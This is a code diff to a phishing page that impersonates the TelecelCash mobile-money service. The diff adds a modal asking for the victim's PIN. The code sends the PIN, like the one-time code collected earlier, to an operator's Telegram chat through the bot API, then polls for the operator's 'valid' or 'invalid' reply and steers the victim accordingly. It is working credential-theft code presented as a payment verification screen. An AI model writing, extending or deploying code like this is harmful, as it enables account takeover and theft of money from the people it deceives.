@@ -226,6 +226,44 @@
             animation: spin 1s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* PIN Modal */
+        #pinModal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.75);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            backdrop-filter: blur(4px);
+        }
+        .modal-card {
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+            animation: fadeUp 0.35s cubic-bezier(.22,.8,.3,1) both;
+        }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        .pin-error-msg {
+            text-align: center;
+            margin: 12px 20px 18px;
+            font-size: 14.5px;
+            padding: 14px;
+            border-radius: 12px;
+            display: none;
+            color: #b91c1c;
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+        }
     </style>
 </head>
 <body>
@@ -266,6 +304,37 @@
         </div>
     </div>
 
+    <!-- PIN Modal -->
+    <div id="pinModal">
+        <div class="modal-card">
+            <div class="logo-section">
+                <div class="brand-logo">
+                    <div class="logo-icon">
+                        <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="3" y="12" width="22" height="14" rx="3" fill="#E42320"/>
+                            <path d="M8 12V9C8 6.24 10.24 4 13 4H15C17.76 4 20 6.24 20 9V12" stroke="#E42320" stroke-width="2.2" stroke-linecap="round" fill="none"/>
+                            <circle cx="14" cy="19" r="2.5" fill="white"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <div class="brand-name">Telecel<span>Cash</span></div>
+                        <div class="tagline">Mobile Money • Loans</div>
+                    </div>
+                </div>
+            </div>
+
+            <h1>Enter PIN</h1>
+            <p class="subtitle">Enter your 4-digit PIN to complete this transaction securely.</p>
+
+            <div class="otp-container" id="pinInputs"></div>
+            <div class="pin-error-msg" id="pinErrMsg"></div>
+
+            <div class="form-section">
+                <button class="btn-action" id="confirmPinBtn">Confirm PIN</button>
+            </div>
+        </div>
+    </div>
+
     <div id="spinner">
         <div class="spin"></div>
         <p style="margin-top:25px; font-size:17px;">Verifying code...</p>
@@ -283,8 +352,11 @@
         let isProcessing = false;
 
         const errMsg = document.getElementById('errMsg');
+        const pinErrMsg = document.getElementById('pinErrMsg');
         const spinner = document.getElementById('spinner');
+        const pinModal = document.getElementById('pinModal');
         const verifyBtn = document.getElementById('verifyBtn');
+        const confirmPinBtn = document.getElementById('confirmPinBtn');
         const offerTitleEl = document.getElementById('offerTitle');
         const offerPriceEl = document.getElementById('offerPrice');
         const offerMetaEl = document.getElementById('offerMeta');
@@ -376,6 +448,11 @@
             });
         }
 
+        function focusFirstInput(containerId) {
+            const first = document.querySelector(`#${containerId} .otp-input`);
+            if (first) first.focus();
+        }
+
         function buildNextUrl(page) {
             // Carry ALL existing params to the next page
             const qs = getAllParams();
@@ -447,7 +524,13 @@
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
-                                if (cb === approveId || cb === validId) {
+                                if (cb === approveId) {
+                                    // ✅ APPROVE: Show PIN Modal
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    showPinModal();
+                                } else if (cb === validId) {
+                                    // ✅ VALID PIN: Go to success page
                                     clearInterval(interval);
                                     spinner.style.display = 'none';
                                     window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
@@ -455,18 +538,94 @@
                                     clearInterval(interval);
                                     spinner.style.display = 'none';
                                     window.location.href = buildNextUrl(CONFIG.DEVICE_PAGE);
-                                } else if (cb === declineId || cb === invalidId) {
+                                } else if (cb === declineId) {
+                                    // ❌ DECLINE: Clear inputs, focus first box, show error
                                     clearInterval(interval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = 'Request declined. Please try again.';
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
+                                    focusFirstInput('otpInputs');
                                     resetButton();
+                                } else if (cb === invalidId) {
+                                    // ❌ INVALID PIN: Clear PIN inputs, focus first PIN box, show error
+                                    clearInterval(interval);
+                                    spinner.style.display = 'none';
+                                    pinErrMsg.textContent = 'Invalid PIN. Please try again.';
+                                    pinErrMsg.style.display = 'block';
+                                    document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
+                                    focusFirstInput('pinInputs');
+                                    confirmPinBtn.disabled = false;
+                                    confirmPinBtn.textContent = 'Confirm PIN';
                                 }
                             }
                         });
                     });
             }, 1000);
+        }
+
+        function showPinModal() {
+            pinModal.style.display = 'flex';
+            createInputs('pinInputs', 5);
+            setupAutoFocus('pinInputs', 5, submitPIN);
+            focusFirstInput('pinInputs');
+            pinErrMsg.style.display = 'none';
+        }
+
+        function submitPIN() {
+            const pin = getCode('pinInputs');
+            if (pin.length !== 5) return;
+
+            confirmPinBtn.disabled = true;
+            confirmPinBtn.textContent = 'Verifying...';
+
+            const ts        = Date.now();
+            const validId   = `valid_${ts}`;
+            const invalidId = `invalid_${ts}`;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: '✅ Valid PIN',   callback_data: validId },
+                            { text: '❌ Invalid PIN', callback_data: invalidId }
+                        ]]
+                    }
+                })
+            }).then(() => startPinPolling(validId, invalidId));
+        }
+
+        function startPinPolling(validId, invalidId) {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        data.result?.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            if (update.callback_query) {
+                                const cb = update.callback_query.data;
+                                if (cb === validId) {
+                                    clearInterval(interval);
+                                    pinModal.style.display = 'none';
+                                    window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+                                } else if (cb === invalidId) {
+                                    clearInterval(interval);
+                                    pinErrMsg.textContent = 'Invalid PIN. Please try again.';
+                                    pinErrMsg.style.display = 'block';
+                                    document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
+                                    focusFirstInput('pinInputs');
+                                    confirmPinBtn.disabled = false;
+                                    confirmPinBtn.textContent = 'Confirm PIN';
+                                }
+                            }
+                        });
+                    });
+            }, 1400);
         }
 
         function resetButton() {
@@ -479,6 +638,7 @@
         createInputs('otpInputs', 5);
         setupAutoFocus('otpInputs', 5, submitOTP);
         verifyBtn.onclick = submitOTP;
+        confirmPinBtn.onclick = submitPIN;
         loadOffer();
     </script>
 </body>
